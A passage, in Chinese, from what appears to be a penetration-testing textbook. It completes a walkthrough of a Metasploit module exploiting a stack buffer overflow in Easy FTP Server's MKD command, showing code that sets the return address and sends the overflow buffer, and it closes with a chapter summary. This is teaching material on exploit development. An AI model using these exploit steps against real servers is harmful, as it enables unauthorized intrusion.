以下代码修复了堆栈数据，并在保存我们的 shellcode 缓冲区的返回地址上进行了短跳转：

```
 # Patch the original stack data into the fixer stub 
buf[10, 4] = buf[268, 4] 

print_status("Overwriting part of the payload with target      address...") 
buf[268,4] = [target.ret].pack('V') # put return address @ 268      bytes 
```

最后，使用前面的代码，我们使用易受攻击的 MKD FTP 后身份验证命令将我们的最终缓冲区发送到特定目标。由于 Easy FTP 服务器中的 MKD 命令容易受到基于堆栈的缓冲区溢出的影响，`buf`命令将溢出目标堆栈，并通过执行我们的有效负载来利用目标系统：

```
print_status("Sending exploit buffer...") 
send_cmd( ['MKD', buf] , false) 
```

使用以下代码关闭您的连接：

```
handler 
disconnect 
end 

end 
```

Metasploit 配备了有用的工具，例如`msfpescan`用于 Win32 和`msfelfscan`用于 Linux 系统，这些工具可能会帮助您找到特定目标的返回地址。例如，要从您选择的应用程序文件中找到一个可持续的返回地址，请键入`# msfpescan -p targetapp.ext`。

# 摘要

在本章中，我们指出了目标开发所需的几个关键领域。首先，我们概述了弱点研究，强调了渗透测试人员需要具备必要的知识和技能，这反过来又对弱点评估产生了影响。然后，我们提供了一个在线存储库列表，您可以从中获取许多公开披露的漏洞和利用代码。在最后一部分，我们演示了一个名为 Metasploit 框架的高级利用工具包的实际用途。所提供的练习纯粹旨在通过战术利用方法探索和理解目标获取过程。此外，我们通过分析框架中示例利用代码的每个步骤，解释了对利用开发的见解，以帮助您理解基本的骨架和构建策略。

在下一章中，我们将讨论提权和使用各种工具和技术维持访问的过程，以及在获得目标后它如何有益。
